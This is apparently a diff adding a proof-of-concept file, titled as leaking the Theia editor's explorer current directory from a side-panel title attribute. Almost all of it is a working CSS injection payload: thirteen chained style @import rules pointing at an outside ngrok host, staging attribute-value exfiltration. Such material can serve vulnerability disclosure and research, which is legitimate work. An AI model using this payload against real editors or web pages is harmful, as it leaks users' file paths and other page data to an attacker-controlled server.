@@ -1,0 +1,4 @@
+# POC: Leaking attribute values
+## Leaking the Editor's explorer current directory from .theia-sidepanel-title[title]
+
+<p><style>@import url(https://798d9e3ab09d.ngrok.io/1); </style><style> @import url(https://798d9e3ab09d.ngrok.io/2); </style><style> @import url(https://798d9e3ab09d.ngrok.io/3)  ;</style><style> @import url(https://798d9e3ab09d.ngrok.io/4)  ;</style><style> @import url(https://798d9e3ab09d.ngrok.io/5)  ;</style><style> @import url(https://798d9e3ab09d.ngrok.io/6)  ;</style><style> @import url(https://798d9e3ab09d.ngrok.io/7)  ;</style><style> @import url(https://798d9e3ab09d.ngrok.io/8)  ;</style><style> @import url(https://798d9e3ab09d.ngrok.io/9)  ;</style><style> @import url(https://798d9e3ab09d.ngrok.io/10)  ;</style><style> @import url(https://798d9e3ab09d.ngrok.io/11)  ;</style><style> @import url(https://798d9e3ab09d.ngrok.io/12)  ;</style><style> @import url(https://798d9e3ab09d.ngrok.io/13)  ;</style>
